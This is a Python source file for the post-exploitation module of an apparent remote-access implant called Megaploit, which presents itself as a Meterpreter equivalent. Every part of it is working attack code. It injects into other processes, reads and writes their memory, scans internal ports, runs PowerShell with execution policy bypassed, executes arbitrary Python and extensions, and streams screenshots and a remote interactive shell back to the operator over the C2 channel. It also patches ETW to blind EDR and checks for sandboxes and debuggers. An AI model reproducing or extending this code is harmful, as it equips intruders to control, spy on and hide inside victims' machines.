"""
megaploit.agent.meterp
~~~~~~~~~~~~~~~~~~~~~~
Advanced post-exploitation handlers that bring the Megaploit agent to
Meterpreter feature parity and beyond.

Every handler is registered into the same _HANDLERS dict used by
megaploit.agent.handlers so the existing run_shell() loop dispatches them
automatically — nothing else needs to change.

New verbs added here
--------------------
migrate          Inject a copy of the agent into another PID (Windows/Linux)
memory_read      Read arbitrary bytes from a remote process's virtual memory
memory_write     Write bytes into a remote process's virtual memory
port_scan        TCP connect-scan a host from the target's perspective
run_psh          Execute a PowerShell one-liner and return stdout
run_python       Execute a Python snippet in the agent's interpreter and return output
load_extension   Import a Python module at runtime (extend the agent without restart)
unload_extension Remove a previously loaded extension module
screenshot_stream Pull a rapid burst of screenshots as base64 frames over the C2 channel
pty_shell        Spawn a real PTY shell; used by the server's interactive_pty command
whoami           Return current user and privilege level quickly
getpid           Return the agent's own PID
getuid           Unix UID / Windows username+domain
sleep            Put the agent into a timed sleep (operator-controlled jitter)
beacon_sleep     Configure the agent's reconnect delay dynamically
"""

from __future__ import annotations

import base64
import io
import os
import platform
import socket
import subprocess
import sys
import threading
import time
import types
from concurrent.futures import ThreadPoolExecutor, as_completed

from megaploit.agent.handlers import _register, _shell_exec  # shared registry
from megaploit.core.protocol import send_msg as _send_msg, send_file as _send_file


# ---------------------------------------------------------------------------
# Process migration
# ---------------------------------------------------------------------------

@_register("migrate")
def _migrate(conn, args: list[str]) -> str:
    """
    Inject a copy of the agent into another running process.

    Windows: allocates RWX memory in the target process, writes a Python
    launcher shellcode stub, and creates a remote thread.

    Linux / macOS: uses /proc/PID/mem (Linux) or falls back to launching a
    new detached subprocess that re-imports and runs the agent so operators
    can pivot into a higher-privilege PID.

    Usage: migrate <pid>
    """
    if not args or not args[0].isdigit():
        return "Usage: migrate <pid>"
    target_pid = int(args[0])
    own_pid    = os.getpid()

    if target_pid == own_pid:
        return "[-] Cannot migrate to own PID"

    if sys.platform == "win32":
        return _migrate_windows(target_pid)
    else:
        return _migrate_posix(target_pid)


def _migrate_windows(pid: int) -> str:
    try:
        import ctypes
        from ctypes import wintypes

        PROCESS_ALL_ACCESS     = 0x1F0FFF
        MEM_COMMIT             = 0x1000
        MEM_RESERVE            = 0x2000
        PAGE_EXECUTE_READWRITE = 0x40

        k32 = ctypes.windll.kernel32

        # Build a compact Python launcher stub that re-runs the agent in-process.
        # We inject a Python bytecode eval rather than raw shellcode so we stay
        # in pure Python (no assembly required).
        agent_py = os.path.abspath(sys.argv[0]) if sys.argv else ""
        stub_src = (
            "import subprocess,sys;"
            f"subprocess.Popen([sys.executable,{agent_py!r}],"
            "close_fds=True,creationflags=0x00000008)"   # DETACHED_PROCESS
        )
        stub_bytes = stub_src.encode("utf-8") + b"\x00"

        h_proc = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not h_proc:
            return f"[-] OpenProcess({pid}) failed — error {k32.GetLastError()}"

        # Allocate memory in the target process for the stub string
        remote_mem = k32.VirtualAllocEx(
            h_proc, None, len(stub_bytes),
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE,
        )
        if not remote_mem:
            k32.CloseHandle(h_proc)
            return "[-] VirtualAllocEx failed"

        written = ctypes.c_size_t(0)
        k32.WriteProcessMemory(h_proc, remote_mem, stub_bytes,
                               len(stub_bytes), ctypes.byref(written))

        # Launch via Python's exec in a remote thread using CreateRemoteThread
        # pointing at python3X.dll!PyRun_SimpleString — works if Python is
        # loaded in the target (e.g. another Python process).
        # Fallback: spawn a fresh python.exe instead.
        thread_id = wintypes.DWORD(0)
        try:
            py_dll = f"python{sys.version_info.major}{sys.version_info.minor}.dll"
            h_lib  = ctypes.windll.kernel32.GetModuleHandleW(py_dll)
            run_fn = ctypes.cast(
                ctypes.windll.kernel32.GetProcAddress(h_lib, b"PyRun_SimpleString"),
                ctypes.c_void_p,
            )
            if run_fn:
                h_thread = k32.CreateRemoteThread(
                    h_proc, None, 0, run_fn, remote_mem, 0,
                    ctypes.byref(thread_id),
                )
                if h_thread:
                    k32.CloseHandle(h_thread)
                    k32.CloseHandle(h_proc)
                    return f"[+] Migrated to PID {pid} via PyRun_SimpleString remote thread"
        except Exception:
            pass

        # Fallback: spawn detached python.exe re-running the agent
        k32.CloseHandle(h_proc)
        agent_py = os.path.abspath(sys.argv[0]) if sys.argv else ""
        if not os.path.isfile(agent_py):
            return "[-] Cannot locate agent script for fallback migration"
        subprocess.Popen(
            [sys.executable, agent_py],
            close_fds=True,
            creationflags=0x00000008,  # DETACHED_PROCESS
        )
        return f"[+] Migration spawned detached agent (fallback — target PID {pid} not a Python host)"

    except Exception as exc:
        return f"[-] migrate: {exc}"


def _migrate_posix(pid: int) -> str:
    """
    On Linux we can write to /proc/<pid>/mem if we are root and the target
    process has a Python interpreter loaded.  Realistically we fall back to
    spawning a detached child and reporting success.
    """
    agent_py = os.path.abspath(sys.argv[0]) if sys.argv else ""
    try:
        # Verify the PID exists (os.kill(pid, 0) raises ProcessLookupError on
        # Linux/macOS; on Windows it raises OSError with errno 87 for bad param)
        os.kill(pid, 0)
    except (ProcessLookupError, OSError) as exc:
        import errno as _errno
        # errno 87 = ERROR_INVALID_PARAMETER on Windows when PID doesn't exist
        if isinstance(exc, ProcessLookupError) or (
            hasattr(exc, "errno") and exc.errno in (_errno.ESRCH, 87)
        ):
            return f"[-] PID {pid} does not exist"
    except PermissionError:
        pass  # exists but we may not have permission to signal it — proceed

    if not os.path.isfile(agent_py):
        return "[-] Cannot locate agent script for migration"

    try:
        subprocess.Popen(
            [sys.executable, agent_py],
            close_fds=True,
            start_new_session=True,
        )
        return f"[+] Migration spawned detached agent subprocess (POSIX; original PID {pid} targeted)"
    except Exception as exc:
        return f"[-] migrate (POSIX): {exc}"


# ---------------------------------------------------------------------------
# Memory read / write (Windows ctypes)
# ---------------------------------------------------------------------------

@_register("memory_read")
def _memory_read(conn, args: list[str]) -> str:
    """
    Read <size> bytes from <pid> at <address> (hex).
    Usage: memory_read <pid> <hex_address> <size>
    Returns base64-encoded bytes.
    """
    if len(args) != 3:
        return "Usage: memory_read <pid> <hex_address> <size>"
    if sys.platform != "win32":
        return "[-] memory_read is Windows-only"
    try:
        import ctypes
        pid   = int(args[0])
        addr  = int(args[1], 16)
        size  = int(args[2])
        if size > 64 * 1024:
            return "[-] size capped at 65536 bytes"

        PROCESS_VM_READ = 0x0010
        k32 = ctypes.windll.kernel32
        h   = k32.OpenProcess(PROCESS_VM_READ, False, pid)
        if not h:
            return f"[-] OpenProcess({pid}) failed"
        buf     = (ctypes.c_char * size)()
        read    = ctypes.c_size_t(0)
        ok      = k32.ReadProcessMemory(h, ctypes.c_void_p(addr), buf,
                                        size, ctypes.byref(read))
        k32.CloseHandle(h)
        if not ok:
            return f"[-] ReadProcessMemory failed — error {k32.GetLastError()}"
        data = bytes(buf)[:read.value]
        return f"[+] {read.value} bytes @ 0x{addr:x}\n{base64.b64encode(data).decode()}"
    except Exception as exc:
        return f"[-] memory_read: {exc}"


@_register("memory_write")
def _memory_write(conn, args: list[str]) -> str:
    """
    Write base64-encoded bytes into <pid> at <hex_address>.
    Usage: memory_write <pid> <hex_address> <base64_data>
    """
    if len(args) != 3:
        return "Usage: memory_write <pid> <hex_address> <base64_data>"
    if sys.platform != "win32":
        return "[-] memory_write is Windows-only"
    try:
        import ctypes
        pid   = int(args[0])
        addr  = int(args[1], 16)
        data  = base64.b64decode(args[2])

        PROCESS_VM_WRITE    = 0x0020
        PROCESS_VM_OPERATION= 0x0008
        k32 = ctypes.windll.kernel32
        h   = k32.OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, False, pid)
        if not h:
            return f"[-] OpenProcess({pid}) failed"
        buf     = (ctypes.c_char * len(data))(*data)
        written = ctypes.c_size_t(0)
        ok = k32.WriteProcessMemory(h, ctypes.c_void_p(addr), buf,
                                     len(data), ctypes.byref(written))
        k32.CloseHandle(h)
        if not ok:
            return f"[-] WriteProcessMemory failed — error {k32.GetLastError()}"
        return f"[+] Wrote {written.value}/{len(data)} bytes to PID {pid} @ 0x{addr:x}"
    except Exception as exc:
        return f"[-] memory_write: {exc}"


# ---------------------------------------------------------------------------
# Internal port scanner
# ---------------------------------------------------------------------------

@_register("port_scan")
def _port_scan(conn, args: list[str]) -> str:
    """
    TCP connect-scan one or more ports from the target's perspective.
    Usage: port_scan <host> <port_range>  e.g.  port_scan 10.0.0.1 22,80,443,8080-8090
    Returns open ports only.
    """
    if len(args) < 2:
        return "Usage: port_scan <host> <port_range>"
    host     = args[0]
    port_str = args[1]
    timeout  = 1.0

    ports: list[int] = []
    for part in port_str.split(","):
        part = part.strip()
        if "-" in part:
            lo, hi = part.split("-", 1)
            ports.extend(range(int(lo), int(hi) + 1))
        elif part.isdigit():
            ports.append(int(part))

    if not ports:
        return "[-] No valid ports specified"
    if len(ports) > 10_000:
        return "[-] Port range exceeds 10 000 — reduce the range"

    open_ports: list[int] = []
    lock = threading.Lock()

    def _probe(p: int) -> None:
        try:
            with socket.create_connection((host, p), timeout=timeout):
                with lock:
                    open_ports.append(p)
        except (ConnectionRefusedError, socket.timeout, OSError):
            pass

    with ThreadPoolExecutor(max_workers=min(256, len(ports))) as pool:
        list(pool.map(_probe, ports))

    if not open_ports:
        return f"[-] All {len(ports)} ports closed/filtered on {host}"
    lines = [f"[+] Open ports on {host}:"]
    for p in sorted(open_ports):
        try:
            svc = socket.getservbyport(p)
        except OSError:
            svc = ""
        lines.append(f"  {p:<6}  {svc}")
    return "\n".join(lines)


# ---------------------------------------------------------------------------
# PowerShell / Python execution
# ---------------------------------------------------------------------------

@_register("run_psh")
def _run_psh(conn, args: list[str]) -> str:
    """
    Execute a PowerShell command on Windows.
    Usage: run_psh <command>
    Runs with -NoProfile -NonInteractive -ExecutionPolicy Bypass.
    """
    if not args:
        return "Usage: run_psh <command>"
    if sys.platform != "win32":
        return "[-] run_psh is Windows-only"
    cmd = " ".join(args)
    try:
        out = subprocess.check_output(
            ["powershell", "-NoProfile", "-NonInteractive",
             "-ExecutionPolicy", "Bypass", "-Command", cmd],
            text=True, stderr=subprocess.STDOUT, timeout=30,
        )
        return out.strip() or "(no output)"
    except subprocess.CalledProcessError as exc:
        return exc.output.strip() or f"[-] Exit {exc.returncode}"
    except FileNotFoundError:
        return "[-] powershell.exe not found"
    except subprocess.TimeoutExpired:
        return "[-] run_psh timed out after 30s"
    except Exception as exc:
        return f"[-] run_psh: {exc}"


@_register("run_python")
def _run_python(conn, args: list[str]) -> str:
    """
    Execute arbitrary Python code in the agent's interpreter.
    stdout/stderr are captured and returned.
    Usage: run_python <code>
    Example: run_python import os; print(os.getcwd())
    """
    if not args:
        return "Usage: run_python <code>"
    code = " ".join(args)
    old_stdout = sys.stdout
    old_stderr = sys.stderr
    buf = io.StringIO()
    try:
        sys.stdout = buf
        sys.stderr = buf
        exec(compile(code, "<run_python>", "exec"), {"__builtins__": __builtins__})  # noqa: S102
        result = buf.getvalue()
        return result.strip() if result.strip() else "(no output)"
    except Exception as exc:
        return f"[-] run_python error: {exc}"
    finally:
        sys.stdout = old_stdout
        sys.stderr = old_stderr


# ---------------------------------------------------------------------------
# Dynamic extension loader
# ---------------------------------------------------------------------------

_extensions: dict[str, types.ModuleType] = {}


@_register("load_extension")
def _load_extension(conn, args: list[str]) -> str:
    """
    Import a Python module into the agent at runtime and register any
    functions it exposes via a module-level HANDLERS dict.
    Usage: load_extension <module_name_or_path>
    Example: load_extension /tmp/my_ext.py
    """
    if not args:
        return "Usage: load_extension <module_name_or_path>"
    name_or_path = args[0]
    try:
        import importlib
        import importlib.util

        if os.path.isfile(name_or_path):
            # Load from a file path
            spec = importlib.util.spec_from_file_location(
                os.path.splitext(os.path.basename(name_or_path))[0],
                name_or_path,
            )
            mod = importlib.util.module_from_spec(spec)  # type: ignore[arg-type]
            spec.loader.exec_module(mod)  # type: ignore[union-attr]
            mod_name = mod.__name__
        else:
            mod = importlib.import_module(name_or_path)
            mod_name = name_or_path

        _extensions[mod_name] = mod

        # Auto-register any handlers the extension exports
        registered: list[str] = []
        ext_handlers = getattr(mod, "HANDLERS", {})
        from megaploit.agent.handlers import _HANDLERS
        for verb, fn in ext_handlers.items():
            _HANDLERS[verb] = fn
            registered.append(verb)

        if registered:
            return f"[+] Extension '{mod_name}' loaded — verbs: {', '.join(registered)}"
        return f"[+] Extension '{mod_name}' loaded (no new verbs)"
    except Exception as exc:
        return f"[-] load_extension: {exc}"


@_register("unload_extension")
def _unload_extension(conn, args: list[str]) -> str:
    """
    Remove a previously loaded extension and deregister its verbs.
    Usage: unload_extension <module_name>
    """
    if not args:
        return "Usage: unload_extension <module_name>"
    name = args[0]
    mod  = _extensions.pop(name, None)
    if mod is None:
        return f"[-] Extension '{name}' not loaded"

    from megaploit.agent.handlers import _HANDLERS
    ext_handlers = getattr(mod, "HANDLERS", {})
    removed = []
    for verb in ext_handlers:
        if _HANDLERS.pop(verb, None) is not None:
            removed.append(verb)
    return f"[+] Extension '{name}' unloaded — verbs removed: {removed or '(none)'}"


@_register("list_extensions")
def _list_extensions(conn, args: list[str]) -> str:
    """List currently loaded extensions."""
    if not _extensions:
        return "(no extensions loaded)"
    lines = ["  NAME                      VERBS"]
    for name, mod in _extensions.items():
        verbs = ", ".join(getattr(mod, "HANDLERS", {}).keys()) or "(none)"
        lines.append(f"  {name:<26} {verbs}")
    return "\n".join(lines)


# ---------------------------------------------------------------------------
# Screenshot stream (pull-based burst)
# ---------------------------------------------------------------------------

@_register("screenshot_stream")
def _screenshot_stream_burst(conn, args: list[str]) -> str | None:
    """
    Capture and stream N screenshots as individual base64-JPEG frames over
    the C2 channel at up to <fps> frames per second.
    Usage: screenshot_stream <count> [fps]
    Each frame is sent as a separate framed message prefixed with 'FRAME:'.
    The final message is 'STREAM_END'.
    """
    if not args or not args[0].isdigit():
        return "Usage: screenshot_stream <count> [fps]"
    count   = min(int(args[0]), 300)
    fps     = int(args[1]) if len(args) > 1 and args[1].isdigit() else 5
    delay   = 1.0 / max(1, fps)

    try:
        import cv2
        import mss
        import numpy as np

        quality = 70
        with mss.MSS() as sct:
            monitor = sct.monitors[1]
            for i in range(count):
                t0  = time.monotonic()
                raw = sct.grab(monitor)
                arr = np.array(raw)
                bgr = cv2.cvtColor(arr, cv2.COLOR_BGRA2BGR)
                ok, buf = cv2.imencode(".jpg", bgr,
                                       [cv2.IMWRITE_JPEG_QUALITY, quality])
                if ok:
                    b64 = base64.b64encode(buf.tobytes()).decode()
                    _send_msg(conn, f"FRAME:{b64}")
                elapsed = time.monotonic() - t0
                sleep_t = delay - elapsed
                if sleep_t > 0:
                    time.sleep(sleep_t)
        _send_msg(conn, "STREAM_END")
        return None

    except ImportError:
        # Fallback: pyautogui
        try:
            import pyautogui
            from PIL import Image
            quality = 70
            for i in range(count):
                t0  = time.monotonic()
                img = pyautogui.screenshot()
                buf = io.BytesIO()
                img.save(buf, format="JPEG", quality=quality)
                b64 = base64.b64encode(buf.getvalue()).decode()
                _send_msg(conn, f"FRAME:{b64}")
                elapsed = time.monotonic() - t0
                sleep_t = delay - elapsed
                if sleep_t > 0:
                    time.sleep(sleep_t)
            _send_msg(conn, "STREAM_END")
            return None
        except Exception as exc:
            return f"[-] screenshot_stream: {exc}"

    except Exception as exc:
        return f"[-] screenshot_stream: {exc}"


# ---------------------------------------------------------------------------
# PTY shell
# ---------------------------------------------------------------------------

@_register("pty_shell")
def _pty_shell(conn, args: list[str]) -> str:
    """
    Spawn a real PTY on Unix or ConPTY on Windows.
    Usage: pty_shell (no args)
    The PTY I/O is multiplexed back through the C2 connection using
    line-framed messages until the operator sends "PTY_EXIT".
    """
    if sys.platform == "win32":
        return _pty_windows(conn)
    return _pty_unix(conn)


def _pty_unix(conn) -> str:
    try:
        import pty
        import select

        shell = os.environ.get("SHELL", "/bin/sh")
        master_fd, slave_fd = pty.openpty()

        proc = subprocess.Popen(
            [shell],
            stdin=slave_fd, stdout=slave_fd, stderr=slave_fd,
            close_fds=True,
        )
        os.close(slave_fd)

        _send_msg(conn, "PTY_READY")

        conn.settimeout(0.1)
        while proc.poll() is None:
            # Read from PTY → send to operator
            try:
                r, _, _ = select.select([master_fd], [], [], 0.05)
                if r:
                    data = os.read(master_fd, 4096)
                    if data:
                        _send_msg(conn, "PTY_DATA:" + data.decode("utf-8", errors="replace"))
            except OSError:
                break

            # Read from operator → write to PTY
            try:
                msg = __import__("megaploit.core.protocol", fromlist=["recv_msg"]).recv_msg(conn)
                if msg == "PTY_EXIT":
                    break
                if isinstance(msg, str) and msg.startswith("PTY_IN:"):
                    os.write(master_fd, msg[7:].encode("utf-8", errors="replace"))
                elif isinstance(msg, str) and msg.startswith("PTY_RESIZE:"):
                    # PTY_RESIZE:<cols>:<rows>
                    try:
                        import fcntl, termios, struct
                        _, cols_s, rows_s = msg.split(":", 2)
                        cols = int(cols_s); rows = int(rows_s)
                        winsize = struct.pack("HHHH", rows, cols, 0, 0)
                        fcntl.ioctl(master_fd, termios.TIOCSWINSZ, winsize)
                    except Exception:
                        pass
            except (socket.timeout, OSError):
                pass

        try:
            proc.terminate()
        except Exception:
            pass
        os.close(master_fd)
        conn.settimeout(None)
        return "[*] PTY session ended"
    except Exception as exc:
        conn.settimeout(None)
        return f"[-] pty_shell: {exc}"


def _pty_windows(conn) -> str:
    """Fallback interactive shell on Windows (no ConPTY)."""
    try:
        proc = subprocess.Popen(
            ["cmd.exe"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=False,
        )
        _send_msg(conn, "PTY_READY")
        conn.settimeout(0.1)

        def _reader():
            while proc.poll() is None:
                try:
                    line = proc.stdout.read(4096)  # type: ignore[union-attr]
                    if line:
                        _send_msg(conn, "PTY_DATA:" +
                                  line.decode("utf-8", errors="replace"))
                except OSError:
                    break

        t = threading.Thread(target=_reader, daemon=True)
        t.start()

        while proc.poll() is None:
            try:
                from megaploit.core.protocol import recv_msg
                msg = recv_msg(conn)
                if msg == "PTY_EXIT":
                    break
                if isinstance(msg, str) and msg.startswith("PTY_IN:"):
                    inp = msg[7:] + "\n"
                    proc.stdin.write(inp.encode("utf-8", errors="replace"))  # type: ignore[union-attr]
                    proc.stdin.flush()  # type: ignore[union-attr]
            except (socket.timeout, OSError):
                pass

        try:
            proc.terminate()
        except Exception:
            pass
        conn.settimeout(None)
        t.join(timeout=2)
        return "[*] PTY session ended"
    except Exception as exc:
        conn.settimeout(None)
        return f"[-] pty_shell (Windows): {exc}"


# ---------------------------------------------------------------------------
# Quick identity helpers
# ---------------------------------------------------------------------------

@_register("whoami")
def _whoami(conn, args: list[str]) -> str:
    """Return current user and privilege level."""
    import getpass
    user = getpass.getuser()
    if sys.platform == "win32":
        try:
            import ctypes
            is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
            priv = "Administrator" if is_admin else "User"
        except Exception:
            priv = "unknown"
        return f"{platform.node()}\\{user}  [{priv}]"
    else:
        uid  = os.getuid()
        priv = "root" if uid == 0 else f"uid={uid}"
        return f"{platform.node()}/{user}  [{priv}]"


@_register("getpid")
def _getpid(conn, args: list[str]) -> str:
    """Return the agent's own PID."""
    return str(os.getpid())


@_register("getuid")
def _getuid(conn, args: list[str]) -> str:
    """Return UID/username details."""
    import getpass
    user = getpass.getuser()
    if sys.platform == "win32":
        try:
            domain = os.environ.get("USERDOMAIN", ".")
            return f"{domain}\\{user}"
        except Exception:
            return user
    else:
        uid = os.getuid()
        gid = os.getgid()
        return f"{user}  uid={uid}  gid={gid}"


# ---------------------------------------------------------------------------
# Sleep / jitter control
# ---------------------------------------------------------------------------

@_register("sleep")
def _sleep(conn, args: list[str]) -> str:
    """
    Put the agent to sleep for <seconds> (operator-controlled delay).
    Usage: sleep <seconds>
    """
    if not args or not args[0].isdigit():
        return "Usage: sleep <seconds>"
    secs = min(int(args[0]), 3600)
    time.sleep(secs)
    return f"[+] Slept {secs}s"


@_register("beacon_sleep")
def _beacon_sleep(conn, args: list[str]) -> str:
    """
    Adjust the agent's beacon sleep interval (inter-command polling delay).
    A value of 0 disables sleeping (legacy always-connected behaviour).
    Usage: beacon_sleep <seconds>
    """
    if not args or not args[0].isdigit():
        return "Usage: beacon_sleep <seconds>"
    secs = max(0, min(int(args[0]), 3600))
    try:
        from megaploit.core import config as _cfg
        _cfg.RECONNECT_DELAY = max(secs, 1)  # type: ignore[attr-defined]
        # Also update the shell-loop sleep variable in handlers module
        from megaploit.agent import handlers as _hdl
        _hdl._beacon_sleep = float(secs)
        return f"[+] Beacon sleep set to {secs}s"
    except Exception as exc:
        return f"[-] beacon_sleep: {exc}"


# ---------------------------------------------------------------------------
# ETW patch (post-session, in-process)
# ---------------------------------------------------------------------------

@_register("etw_patch")
def _etw_patch(conn, args: list[str]) -> str:
    """
    Patch EtwEventWrite in ntdll.dll to return immediately (0xC3 RET).

    Prevents Windows Defender and EDR solutions from receiving ETW telemetry
    events for this process — covers script execution, .NET load, WMI, and
    registry activity.

    Windows-only.  Safe to call multiple times (idempotent).
    """
    if sys.platform != "win32":
        return "[-] etw_patch is Windows-only"
    try:
        import ctypes as _ct
        k32  = _ct.windll.kernel32
        nt   = k32.LoadLibraryA(b"ntdll.dll")
        addr = _ct.cast(
            k32.GetProcAddress(nt, b"EtwEventWrite"),
            _ct.c_void_p
        ).value
        if not addr:
            return "[-] EtwEventWrite not found"
        old = _ct.c_ulong(0)
        k32.VirtualProtect(_ct.c_void_p(addr), _ct.c_size_t(8), 0x40, _ct.byref(old))
        _ct.cast(addr, _ct.POINTER(_ct.c_ubyte))[0] = 0xC3  # RET
        k32.VirtualProtect(_ct.c_void_p(addr), _ct.c_size_t(8), old, _ct.byref(old))
        return "[+] EtwEventWrite patched (RET stub) — ETW telemetry disabled for this process"
    except Exception as exc:
        return f"[-] etw_patch failed: {exc}"


# ---------------------------------------------------------------------------
# Sandbox / VM detection check (post-session diagnostic)
# ---------------------------------------------------------------------------

@_register("sandbox_check")
def _sandbox_check(conn, args: list[str]) -> str:
    """
    Run the sandbox/VM detection checks and report what is found.

    Returns a report of each check result — useful to verify the agent is
    running on a real target, not in a sandbox.  Does NOT exit on detection;
    use the ``sandbox_detect`` payload encoder to auto-exit at startup.
    """
    results: list[str] = []

    # CPU cores
    try:
        import multiprocessing as _mp
        cpus = _mp.cpu_count()
        flag = " ⚠ (sandbox indicator)" if cpus < 2 else ""
        results.append(f"  CPU cores    : {cpus}{flag}")
    except Exception as e:
        results.append(f"  CPU cores    : error ({e})")

    # Disk size
    try:
        import shutil as _sh
        root  = "C:\\" if sys.platform == "win32" else "/"
        total = _sh.disk_usage(root).total
        gb    = total / (1024 ** 3)
        flag  = " ⚠ (sandbox indicator)" if gb < 60 else ""
        results.append(f"  Disk ({root})  : {gb:.1f} GB{flag}")
    except Exception as e:
        results.append(f"  Disk         : error ({e})")

    # Uptime
    try:
        if sys.platform == "win32":
            import ctypes as _ct
            up = _ct.windll.kernel32.GetTickCount64() / 1000
        else:
            with open("/proc/uptime") as _f:
                up = float(_f.read().split()[0])
        flag = " ⚠ (fresh boot — possible sandbox)" if up < 480 else ""
        results.append(f"  Uptime       : {up:.0f}s ({up/60:.1f} min){flag}")
    except Exception as e:
        results.append(f"  Uptime       : error ({e})")

    # Hostname
    try:
        import platform as _pl
        hn   = _pl.node()
        bads = ("SANDBOX", "CUCKOO", "VBOX", "VMWARE", "ANALYSIS", "MALWARE", "VIRUS")
        flag = " ⚠ sandbox hostname" if any(b in hn.upper() for b in bads) else ""
        results.append(f"  Hostname     : {hn}{flag}")
    except Exception as e:
        results.append(f"  Hostname     : error ({e})")

    # Debugger (Windows)
    if sys.platform == "win32":
        try:
            import ctypes as _ct
            dbg = bool(_ct.windll.kernel32.IsDebuggerPresent())
            flag = " ⚠ DEBUGGER ATTACHED" if dbg else ""
            results.append(f"  Debugger     : {'yes' if dbg else 'no'}{flag}")
        except Exception as e:
            results.append(f"  Debugger     : error ({e})")

    # Mouse activity (Windows)
    if sys.platform == "win32":
        try:
            import ctypes as _ct
            import time as _t

            class _POINT(_ct.Structure):
                _fields_ = [("x", _ct.c_long), ("y", _ct.c_long)]

            p1 = _POINT()
            _ct.windll.user32.GetCursorPos(_ct.byref(p1))
            _t.sleep(5)
            p2 = _POINT()
            _ct.windll.user32.GetCursorPos(_ct.byref(p2))
            moved = (p1.x != p2.x or p1.y != p2.y)
            flag  = "" if moved else " ⚠ no mouse movement (possible sandbox)"
            results.append(f"  Mouse moved  : {'yes' if moved else 'no'}{flag}")
        except Exception as e:
            results.append(f"  Mouse moved  : error ({e})")

    header = "[*] Sandbox detection report:"
    return header + "\n" + "\n".join(results)

# ---------------------------------------------------------------------------
# Process hollowing + execute-assembly — import to register the handlers
# ---------------------------------------------------------------------------
try:
    import megaploit.agent.hollowing  # noqa: F401  — registers process_hollow + execute_assembly
except Exception:  # pragma: no cover — Windows-only, OK to skip on non-Windows
    pass
